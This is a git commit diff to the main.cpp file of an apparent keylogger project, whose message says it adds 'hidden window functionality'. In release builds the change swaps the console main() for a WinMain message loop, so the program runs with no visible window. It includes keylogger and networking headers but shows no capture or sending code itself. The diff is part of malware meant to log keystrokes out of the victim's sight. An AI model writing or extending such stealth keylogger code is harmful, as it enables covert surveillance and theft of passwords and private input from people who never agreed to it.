de44601e61eb8667ac5da24e30e4c3d921e733ce
C1N0 <cinnn0theprogrammer@gmail.com>
2023-11-29 22:13:00 +0200

    Added hidden window functionality, and code dividing.

--- src/keylogger/main.cpp
+++ src/keylogger/main.cpp
@@ -1,8 +1,11 @@
 #include "keylogger.h"
 #include "kqnet.h"
 #include "common.h"
+#include "Windows.h"
 
 keylogger transKeys;
+
+#ifdef _DEBUG
 
 int main() {
 
@@ -13,3 +16,17 @@ int main() {
     }
     return 0;
 }
+
+#else
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    return 0;
+}
+
+#endif
